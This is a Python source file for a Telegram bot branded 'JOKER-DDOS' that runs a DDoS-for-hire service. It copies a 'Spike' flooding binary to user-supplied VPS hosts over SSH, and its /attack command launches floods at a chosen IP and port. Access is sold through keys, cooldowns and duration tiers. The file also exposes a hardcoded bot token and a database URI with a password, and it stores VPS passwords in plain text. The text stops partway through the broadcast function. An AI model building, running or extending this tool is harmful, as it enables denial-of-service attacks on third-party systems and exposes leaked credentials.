import logging
import datetime
import asyncio
import time
import random
from collections import defaultdict  # ✅ Added here

from pymongo import MongoClient
from bson import Binary

import asyncssh

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackContext,
    MessageHandler,
    CallbackQueryHandler,
    filters
)
from telegram.helpers import escape_markdown
from telegram.error import TelegramError
from telegram.constants import ParseMode
from telegram.ext import ConversationHandler
from datetime import timedelta

# ✅ Global usage tracker for cooldown
start_usage_tracker = defaultdict(list)
START_TIME = time.time()  # 🔥 Uptime tracking starts here
# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7795656753:AAGYmg5bZ0lZAOwhZzCEL8LoPxTyffutGzM'  
MONGO_URI = "mongodb+srv://KalkiGamesYT:Redardo2305@test.hmv7x.mongodb.net/?retryWrites=true&w=majority&appName=Test"  # Replace with your MongoDB URI
DB_NAME = "TEST"
VPS_COLLECTION_NAME = "vps_list"
SETTINGS_COLLECTION_NAME = "settings"
USERS_COLLECTION_NAME = "broadcast"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]
vps_collection = db[VPS_COLLECTION_NAME]
users_collection = db[USERS_COLLECTION_NAME]
ASK_TYPE, ASK_SINGLE_KEY, ASK_SINGLE_LIMIT, ASK_BULK_FILE, ASK_BULK_LIMIT = range(5)
KEYS_COLLECTION = db["keys"]


ADMIN_USER_ID = 7795055510  # Replace with your admin user ID
# A dictionary to track the last attack time for each user (Cooldown starts after attack completion)
last_attack_time = {}
SSH_SEMAPHORE = asyncio.Semaphore(100)

# ✅ Final /start with Image + Welcome + Help in one message
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    now = time.time()

    # Only non-admin cooldown check
    if user_id != ADMIN_USER_ID:
        timestamps = start_usage_tracker[user_id]
        timestamps = [ts for ts in timestamps if now - ts <= 30]
        timestamps.append(now)
        start_usage_tracker[user_id] = timestamps

        if len(timestamps) > 2:
            last_used = timestamps[-1]
            cooldown_end = last_used + 60
            remaining = int(cooldown_end - now)
            if remaining > 0:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"🕒 *Too many /start commands!*\nPlease wait *{remaining} seconds* before trying again.",
                    parse_mode="Markdown"
                )
                return

    # Random image selection
    your_image_urls =  [
    # iili.io URLs
    'https://iili.io/2Pq8QQn.jpg',
    'https://iili.io/2Pq8tBs.jpg',
    'https://iili.io/2Pq8DEG.jpg',
    'https://iili.io/2PqS3Qe.jpg',
    'https://iili.io/2PqSfEb.jpg',
    'https://iili.io/2PqSnYQ.jpg',
    'https://iili.io/2PqSxyB.jpg',
    'https://iili.io/2PqSuZF.jpg',
    'https://iili.io/2PqS76J.jpg',
    'https://iili.io/2PqS0yN.jpg',
    'https://iili.io/2PqSMZX.jpg',
    'https://iili.io/2PqSXGs.jpg',
    'https://iili.io/2PqSk92.jpg',
    'https://iili.io/2PqSvuS.jpg',
    'https://iili.io/2PqSs8Q.jpg',
    'https://iili.io/2PqStwP.jpg',
    'https://iili.io/2PqUdSR.jpg',
    'https://iili.io/2PqUFAN.jpg',
    'https://iili.io/2PqUftt.jpg',
    'https://iili.io/2PqUCVn.jpg',
    'https://iili.io/2PqUnPs.jpg',
    'https://iili.io/2PqUxKG.jpg',
    'https://iili.io/2PqUIS4.jpg',
    'https://iili.io/2PqURNS.jpg',
    'https://iili.io/2PqUaVe.jpg',
    'https://graph.org/file/1fd315652fe7e1228a195-36f288ea3084a9ced8.jpg',
    'https://graph.org/file/0f4d59848163cdb7d2442-2ecb433c158a0eed3d.jpg',
    'https://graph.org/file/628a26e7278b2f228e960-065639f84e3207d147.jpg',
    'https://graph.org/file/d35f0e942832bba5ac0e2-a680653b0e4ea53e66.jpg',
    'https://graph.org/file/d0296c609c0a10f95f93e-f8416d85fa033300e4.jpg',
    'https://graph.org/file/19b7cd129afb26aca9929-0b82014c407cc45798.jpg',
    'https://graph.org/file/d56ba2c35062c515ff5a0-15a3b349d04142fd48.jpg',
    'https://graph.org/file/579de7aae39078903a582-3219aee46a78234a64.jpg',
    'https://graph.org/file/9409044466777f0d10767-06350a8392c9b76420.jpg',
    'https://graph.org/file/3ae5a0c2c9507f1d5d54b-509d969c9525b64462.jpg',
    'https://graph.org/file/a43fcc5a2ca4ff8fd8c90-20e39c2fb8e47ddc4f.jpg',
    'https://graph.org/file/0063cc3e9e8d00248b58d-67e2a8e84323281e1e.jpg',
    'https://graph.org/file/e64ceead2bbb391f6d547-28e922c6e52896df72.jpg',
    'https://graph.org/file/2b8d11cc67508a9538ee8-009a057d1426166af3.jpg',
    'https://graph.org/file/b1ac2403000df94986bcd-730012f7bc377127c0.jpg',
    'https://graph.org/file/c2cfd36510d5377ddd1f5-ab5c77bb36aa0b7c20.jpg',
    'https://graph.org/file/00d6616964a5fa509fee8-3d7687742f86988ec7.jpg',
    'https://graph.org/file/f0979dc4a8dca10d8a6f2-35c7f3edff9e9f4be1.jpg',
    'https://graph.org/file/64b94443558776413fc76-793f2c38a669b04594.jpg',
    'https://graph.org/file/16a630de803022191ad86-11f5db0b517fd6ac77.jpg',
]
    image_url = random.choice(your_image_urls)

    # Help text (same as in help_command)
    if user_id == ADMIN_USER_ID:
        help_text = (
            "*ℹ️ Admin Help Menu*\n\n"
            "*🔸 /add_vps* - Add your VPS for attacks.\n"
            "*🔸 /setup* - Set up your VPS for attack configuration.\n"
            "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
            "*🔸 /vps_status* - Check the status of your VPS.\n"
            "*🔸 /show* - View attack settings.\n"
            "*🔸 /add <user_id> <expiry_time>* - Add a user with access.\n"
            "*🔸 /remove <user_id>* - Remove a user.\n"
            "*🔸 /users* - List users with access.\n"
            "*🔸 /byte <size>* - Set packet size.\n"
            "*🔸 /thread <count>* - Set thread count.\n"
            "*🔸 /upload* - Upload Spike binary.\n"
            "*🔸 /key_upload* - Upload keys (Single/Bulk) and set limits.\n"
            "*🔸 /key* - Users can use this to claim their key.\n"
            "*🔸 /remove_vps* - Remove your VPS from the bot.\n"
            "*🔸 /all_vps* - Admin can view all VPS added in the system.\n"
            "*🔸 /key_reset* - Delete all saved keys and reset for new batch.\n"
            "*🔸 /post* - Reply to media to broadcast it to all users.\n"   
            "*🔸 /uptime* - Show how long the bot has been running.\n"
            "*🔸 /remove_vps <ip> <user> <pass>* - Remove any VPS by credentials.\n"  
            "*🔸 /key_status* - Show key usage (used / total).\n"  
            "*🔸 /update_plan* - (Admin) Update the DDOS plan.\n"          
            "*🔸 /plan* - View the latest DDOS plan.\n"                      
        )
    else:
        help_text = (
            "*ℹ️ Help Menu*\n\n"
            "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
            "*🔸 /key* - Claim your access key.\n"
            "*🔸 /uptime* - Show how long the bot has been running.\n"
            "*🔸 /plan* - View the latest DDOS plan."
        )

    # Combined caption
    caption = (
        "🔥 *Welcome to the Battlefield!* 🔥\n\n"
        "⚔️ Prepare for war!\n\n" +
        help_text
    )

    # Safe Send Photo
    if len(caption) > 1024:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=image_url
        )
        await context.bot.send_message(
            chat_id=chat_id,
            text=caption,
            parse_mode="Markdown"
        )
    else:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=image_url,
            caption=caption,
            parse_mode="Markdown"
        )

    # Save user to DB
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {
            "user_id": user_id,
            "chat_id": chat_id,
            "username": username,
            "first_name": first_name
        }},
        upsert=True
    )

# Define help menu for users and admins
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    user_help_text = (
        "ℹ️ *Help Menu*\n\n"
        "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
        "*🔸 /key* - Claim your access key.\n"
    )

    admin_help_text = (
        "ℹ️ *Admin Help Menu*\n\n"
        "*🔸 /add_vps* - Add your VPS for attacks.\n"
        "*🔸 /setup* - Set up your VPS for attack configuration.\n"
        "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
        "*🔸 /vps_status* - Check the status of your VPS.\n"
        "*🔸 /show* - View attack settings.\n"
        "*🔸 /add <user_id> <expiry_time>* - Add a user with access.\n"
        "*🔸 /remove <user_id>* - Remove a user.\n"
        "*🔸 /users* - List users with access.\n"
        "*🔸 /byte <size>* - Set the packet size for attacks.\n"
        "*🔸 /thread <count>* - Set the thread count for attacks.\n"
        "*🔸 /upload* - Upload required files for attacks.\n\n"
        "For more commands, contact the admin."
    )

    help_text = admin_help_text if user_id == ADMIN_USER_ID else user_help_text

    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=help_text,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Help error: {e}")

async def remove_vps(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /remove_vps <ip> <username> <password>")
        return

    ip, username, password = context.args

    if user_id == ADMIN_USER_ID:
        # Admin can remove any VPS
        result = vps_collection.delete_one({
            "ip": ip,
            "username": username,
            "password": password
        })
    else:
        # Normal user can remove only their own VPS
        result = vps_collection.delete_one({
            "user_id": user_id,
            "ip": ip,
            "username": username,
            "password": password
        })

    if result.deleted_count > 0:
        await update.message.reply_text(f"✅ VPS `{ip}` removed successfully.", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ VPS not found.")


async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch all VPS details for the user
    vps_data = list(vps_collection.find({"user_id": user_id}))

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *No VPS configured!*\nUse /add_vps to add your VPS details and get started.",
            parse_mode="Markdown",
        )
        return

    message = "🌐 *Your VPS List:*\n"
    for vps in vps_data:
        vps_number = vps.get("vps_number", "N/A")
        ip = vps.get("ip", "N/A")
        username = vps.get("username", "N/A")
        in_use = "✅ In Use" if vps.get("in_use", False) else "🆓 Available"

        message += (
            f"\n🖥️ *VPS{vps_number}:*\n"
            f"🔹 *IP:* `{ip}`\n"
            f"👤 *Username:* `{username}`\n"
            f"⚡ *Status:* {in_use}\n"
            "───────────────"
        )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')


async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')
async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    # Retrieve the current settings from MongoDB
    settings = settings_collection.find_one()  # Get the first (and only) document in the settings collection
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    # Send the settings to the user
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_vps <ip> <username> <password>*", parse_mode='Markdown')
        return

    ip, username, password = args

    # Fetch existing VPS list for the user
    existing_vps = list(vps_collection.find({"user_id": user_id}))

    if len(existing_vps) >= 4:
        await context.bot.send_message(chat_id=chat_id, text="*🚫 Bot Server is busy. Try again later!*", parse_mode='Markdown')
        return

    # Assign next VPS number
    vps_number = len(existing_vps) + 1  

    # Save new VPS
    vps_collection.insert_one({
        "user_id": user_id,
        "vps_number": vps_number,
        "ip": ip,
        "username": username,
        "password": password,
        "in_use": False  # Default: Not in use
    })

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ VPS{vps_number} added successfully!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Admin bypass restrictions
    if user_id == ADMIN_USER_ID:
        cooldown_time = 0  # No cooldown for admin
    else:
        cooldown_time = 600  # Cooldown period for regular users

    current_time = time.time()
    if user_id in last_attack_time and current_time - last_attack_time[user_id] < cooldown_time:
        remaining_cooldown = cooldown_time - (current_time - last_attack_time[user_id])
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You must wait {int(remaining_cooldown)} seconds before launching another attack.*",
            parse_mode="Markdown"
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode="Markdown"
        )
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Restrict attack duration for non-admins
    if user_id != ADMIN_USER_ID and duration > 240:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You can only attack for a maximum of 240 seconds!",
            parse_mode="Markdown"
        )
        return

    allowed_duration = duration

    # Fetch eligible VPSs
    if user_id == ADMIN_USER_ID:
        # Admin attack => All VPSs
        vps_list = list(vps_collection.find({}))
    else:
        # Check if user is in Admin's VPS friends
        admin_vps_list = list(vps_collection.find({
            "user_id": ADMIN_USER_ID,
            "friends.user_id": user_id,
            "friends.expiry": {"$gte": datetime.datetime.utcnow()}
        }))

        if admin_vps_list:
            # User has access to Admin VPS
            vps_list = admin_vps_list
        else:
            # Otherwise use own VPS
            vps_list = list(vps_collection.find({"user_id": user_id}))

    if not vps_list:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ No authorized VPS available for you. Add your own or get access.*",
            parse_mode="Markdown",
        )
        return

    settings = settings_collection.find_one() or {}
    threads = settings.get("threads", 10)
    packet_size = settings.get("packet_size", 512)

    # Attack Launched Message
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched!*\n"
            f"*🎯 Target: {target_ip}:{port}*\n"
            f"*🕒 Duration: {allowed_duration} seconds*\n"
            f"*🚀 VPS Used: {len(vps_list)}*\n"
            f"*💥 Powered By JOKER-DDOS*"
        ),
        parse_mode="Markdown",
    )

    last_attack_time[user_id] = current_time

    # Start attacks on all VPS
    for vps in vps_list:
        asyncio.create_task(run_ssh_attack(vps, target_ip, port, allowed_duration, threads, packet_size, chat_id, context))

    # Start timer as background task
    asyncio.create_task(update_attack_timer(msg, allowed_duration, target_ip, port, len(vps_list)))

# New background timer function
async def update_attack_timer(msg, allowed_duration, target_ip, port, vps_used):
    """Background attack timer updater."""
    remaining = allowed_duration
    while remaining > 0:
        try:
            await asyncio.sleep(1)
            remaining -= 1
            if remaining < 0:
                remaining = 0
            await msg.edit_text(
                f"*⚔️ Attack Running!*\n"
                f"*🎯 Target: {target_ip}:{port}*\n"
                f"*⏳ Remaining Time: {remaining} seconds*\n"
                f"*🚀 VPS Used: {vps_used}*\n"
                f"*💥 Powered By JOKER-DDOS*",
                parse_mode="Markdown"
            )
        except TelegramError:
            break

    # Attack Completed Final Message
    try:
        await msg.edit_text(
            f"*✅ Attack Completed!*\n"
            f"*🎯 Target: {target_ip}:{port}*\n"
            f"*🕒 Duration: {allowed_duration} seconds*\n"
            f"*💥 Powered By JOKER-DDOS*",
            parse_mode="Markdown"
        )
    except TelegramError:
        pass

async def run_ssh_attack(vps, target_ip, port, duration, threads, packet_size, chat_id, context):
    """Run the attack command on multiple VPS asynchronously."""
    async with SSH_SEMAPHORE:  # Limit concurrent SSH connections
        try:
            async with asyncssh.connect(
                vps["ip"],
                username=vps["username"],
                password=vps["password"],
                known_hosts=None
            ) as conn:
                command = f"./Spike {target_ip} {port} {duration} {packet_size} {threads}"
                result = await conn.run(command, check=True)
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*✅ Attack completed from {vps['ip']}!*",
                    parse_mode="Markdown"
                )
        except asyncssh.Error as e:
            logger.error(f"SSH Error on {vps['ip']}: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ SSH Error on {vps['ip']}: {str(e)}*",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"General Error on {vps['ip']}: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ Error on {vps['ip']}: {str(e)}*",
                parse_mode="Markdown"
            )


# Command for admins to upload the Spike binary
async def upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id=chat_id, text="✅ *Send the Spike binary now.*", parse_mode="Markdown")

# Handle binary file uploads
# Handle binary file uploads
async def handle_file_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to upload files!*", parse_mode="Markdown")
        return

    document = update.message.document
    if document.file_name != "Spike":
        await context.bot.send_message(chat_id=chat_id, text="❌ *Please upload the correct file (Spike binary).*", parse_mode="Markdown")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Replace or insert the binary with upsert
    result = settings_collection.update_one(
        {"name": "binary_spike"},
        {"$set": {"binary": Binary(file_content)}},
        upsert=True  # ✅ This ensures the document is created if it doesn't exist
    )

    await context.bot.send_message(chat_id=chat_id, text="✅ *Spike binary uploaded successfully.*", parse_mode="Markdown")

async def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No VPS configured! Add your VPS details and get started."),
            parse_mode="Markdown",
        )
        return

    # Fetch the stored Spike binary from MongoDB
    spike_binary_doc = settings_collection.find_one({"name": "binary_spike"})
    if not spike_binary_doc:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No Spike binary found! Admin must upload it first."),
            parse_mode="Markdown",
        )
        return

    spike_binary = spike_binary_doc["binary"]
    ip = vps_data.get("ip")
    username = vps_data.get("username")
    password = vps_data.get("password")

    try:
        async with asyncssh.connect(
            ip,
            username=username,
            password=password,
            known_hosts=None  # Disable host key checking
        ) as conn:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("🔄 Uploading Spike binary..."),
                parse_mode="Markdown",
            )

            # Upload the Spike binary
            async with conn.start_sftp_client() as sftp:
                async with sftp.open("Spike", "wb") as remote_file:
                    await remote_file.write(spike_binary)

            # Set permissions for the uploaded Spike binary
            await conn.run("chmod +x Spike", check=True)

            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("✅ Spike binary uploaded and permissions set successfully."),
                parse_mode="Markdown",
            )

    except asyncssh.Error as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ SSH Error: {str(e)}"),
            parse_mode="Markdown",
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ Error: {str(e)}"),
            parse_mode="Markdown",
        )

async def add_friend(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /add <user_id> <m/d>*",
            parse_mode="Markdown"
        )
        return

    friend_id = int(args[0])
    expiry_time = args[1]

    # Calculate expiry timestamp
    current_time = datetime.datetime.utcnow()
    if "m" in expiry_time:
        expiry = current_time + datetime.timedelta(minutes=int(expiry_time.replace("m", "")))
    elif "d" in expiry_time:
        expiry = current_time + datetime.timedelta(days=int(expiry_time.replace("d", "")))
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid expiry time format. Use 1m or 1d.*",
            parse_mode="Markdown"
        )
        return

    # Fetch all VPSs of the owner
    vps_list = list(vps_collection.find({"user_id": owner_id}))
    if not vps_list:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ No VPS configured. Use /add_vps to add one!*",
            parse_mode="Markdown"
        )
        return

    for vps in vps_list:
        friends = vps.get("friends", [])
        for friend in friends:
            if friend["user_id"] == friend_id:
                friend["expiry"] = expiry
                break
        else:
            friends.append({"user_id": friend_id, "expiry": expiry})

        vps_collection.update_one(
            {"_id": vps["_id"]},
            {"$set": {"friends": friends}}
        )

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ User {friend_id} has been granted access to all your VPS until {expiry}.*",
        parse_mode="Markdown"
    )

async def list_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    # Fetch VPS data
    vps_data = vps_collection.find_one({"user_id": owner_id})
    if not vps_data or "friends" not in vps_data or not vps_data["friends"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*📂 No users have been granted access to your VPS.*",
            parse_mode="Markdown"
        )
        return

    # Prepare a dictionary to store the latest expiry time for each user
    current_time = datetime.datetime.utcnow()
    active_users = []
    for friend in vps_data["friends"]:
        user_id = friend["user_id"]
        expiry = friend.get("expiry")
        if expiry and current_time < expiry:
            active_users.append(f"✅ User ID: {user_id} | ⏳ Expiry: {expiry.date()}")

    # Check if there are active users
    if not active_users:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*📂 No users currently have active access to your VPS.*",
            parse_mode="Markdown"
        )
        return

    # Prepare and send the message
    users_message = "*🔑 Users with VPS Access:*\n" + "\n".join(active_users)
    await context.bot.send_message(
        chat_id=chat_id,
        text=users_message,
        parse_mode="Markdown"
    )

async def all_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this command.", parse_mode="Markdown")
        return

    vps_data = list(vps_collection.find())
    if not vps_data:
        await context.bot.send_message(chat_id=chat_id, text="❌ No VPS found in the database.", parse_mode="Markdown")
        return

    message = """🌐 *All VPS List:*"""
    for vps in vps_data:
        ip = vps.get("ip", "N/A")
        username = vps.get("username", "N/A")
        password = vps.get("password", "N/A")
        owner_id = vps.get("user_id", "N/A")
        message += f"""
👤 *Owner:* `{owner_id}`
🔹 *IP:* `{ip}`
👤 *Username:* `{username}`
🔐 *Password:* `{password}`
───────────────
"""

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /remove <user_id>*",
            parse_mode="Markdown"
        )
        return

    friend_id = int(args[0])

    # Fetch VPS data
    vps_data = vps_collection.find_one({"user_id": owner_id})
    if not vps_data or "friends" not in vps_data or not vps_data["friends"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ No users to remove.*",
            parse_mode="Markdown"
        )
        return

    # Remove the user
    updated_friends = [friend for friend in vps_data["friends"] if friend["user_id"] != friend_id]
    vps_collection.update_one({"user_id": owner_id}, {"$set": {"friends": updated_friends}})

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ User {friend_id} has been removed from your VPS access list.*",
        parse_mode="Markdown"
    )

# Background task to remove expired users
async def remove_expired_users():
    while True:
        current_time = datetime.datetime.utcnow()
        # Fetch all VPS entries
        all_vps = vps_collection.find()

        for vps_data in all_vps:
            friends = vps_data.get("friends", [])
            updated_friends = [
                friend for friend in friends
                if "expiry" in friend and current_time < friend["expiry"]
            ]

            # Update the database if any expired users were removed
            if len(updated_friends) != len(friends):
                vps_collection.update_one(
                    {"_id": vps_data["_id"]},
                    {"$set": {"friends": updated_friends}}
                )

        # Wait 30 seconds before the next cleanup
        await asyncio.sleep(30)

# Modify main function to include the background task
async def start_key_upload(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return ConversationHandler.END

    await update.message.reply_text("🔑 Type `single` for one key (multi-device), or `bulk` for multiple keys:")
    return ASK_TYPE

async def handle_key_type_text(update: Update, context: CallbackContext):
    text = update.message.text.lower().strip()
    if text == 'single':
        context.user_data['key_type'] = 'single'
        await update.message.reply_text("📝 Send the single key (as text):")
        return ASK_SINGLE_KEY
    elif text == 'bulk':
        context.user_data['key_type'] = 'bulk'
        await update.message.reply_text("📄 Reply with a .txt file (one key per line):")
        return ASK_BULK_FILE
    else:
        await update.message.reply_text("⚠️ Please reply with either `single` or `bulk`.")
        return ASK_TYPE

async def receive_single_key(update: Update, context: CallbackContext):
    context.user_data['single_key'] = update.message.text.strip()
    await update.message.reply_text("How many devices should this key support?")
    return ASK_SINGLE_LIMIT

async def receive_single_limit(update: Update, context: CallbackContext):
    try:
        limit = int(update.message.text)
        KEYS_COLLECTION.insert_one({
            "key": context.user_data['single_key'],
            "users": [],
            "max_limit": limit
        })
        await update.message.reply_text(f"✅ Key saved with max {limit} users.")
    except:
        await update.message.reply_text("❌ Invalid number.")
    return ConversationHandler.END

async def receive_bulk_file(update: Update, context: CallbackContext):
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a valid .txt file.")
        return ASK_BULK_FILE

    file = await context.bot.get_file(update.message.document.file_id)
    content = await file.download_as_bytearray()
    context.user_data['bulk_keys'] = [line.strip() for line in content.decode("utf-8").splitlines() if line.strip()]
    
    await update.message.reply_text("How many devices per key?")
    return ASK_BULK_LIMIT

async def receive_bulk_limit(update: Update, context: CallbackContext):
    try:
        limit = int(update.message.text)
        count = 0
        for key in context.user_data['bulk_keys']:
            if not KEYS_COLLECTION.find_one({"key": key}):
                KEYS_COLLECTION.insert_one({"key": key, "users": [], "max_limit": limit})
                count += 1
        await update.message.reply_text(f"✅ {count} keys uploaded with {limit} users per key.")
    except:
        await update.message.reply_text("❌ Invalid number.")
    return ConversationHandler.END

async def get_key(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    existing = KEYS_COLLECTION.find_one({"users": user_id})
    if existing:
        key = existing["key"]
    else:
        key_data = KEYS_COLLECTION.find_one_and_update(
            {"$expr": {"$lt": [{"$size": "$users"}, "$max_limit"]}},
            {"$push": {"users": user_id}}
        )
        if not key_data:
            await update.message.reply_text("❌ All keys are used up.")
            return
        key = key_data["key"]

    await update.message.reply_text(
    f"""🗝️ *This is your key:*\n`{key}`

🎮 *Go and play and send feedback.*
🚫 *Otherwise key block.*

❓ *For any query:* DM @KalkiGamesYT""",
    parse_mode="Markdown"
)

async def key_reset(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return

    result = KEYS_COLLECTION.delete_many({})
    await update.message.reply_text(f"🧹 All keys have been deleted. Total removed: {result.deleted_count}")

async def post(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("⚠️ Please reply to a media message (photo, video, document, audio, voice) with /post.")
        return

    media_message = update.message.reply_to_message
    caption = media_message.caption or ""

    users = users_collection.find()
    success_count = 0
    failure_count = 0

    await update.message.reply_text("🚀 Broadcast started... Please wait!")

    for user in users:
        chat_id = user.get("chat_id")
        try:
            if media_message.photo:
                file_id = media_message.photo[-1].file_id
                await context.bot.send_photo(chat_id=chat_id, photo=file_id, caption=caption, parse_mode="Markdown")
            elif media_message.video:
                file_id = media_message.video.file_id
                await context.bot.send_video(chat_id=chat_id, video=file_id, caption=caption, parse_mode="Markdown")
            elif media_message.document:
                file_id = media_message.document.file_id
                await context.bot.send_document(chat_id=chat_id, document=file_id, caption=caption, parse_mode="Markdown")
            elif media_message.audio:
                file_id = media_message.audio.file_id
                if caption:
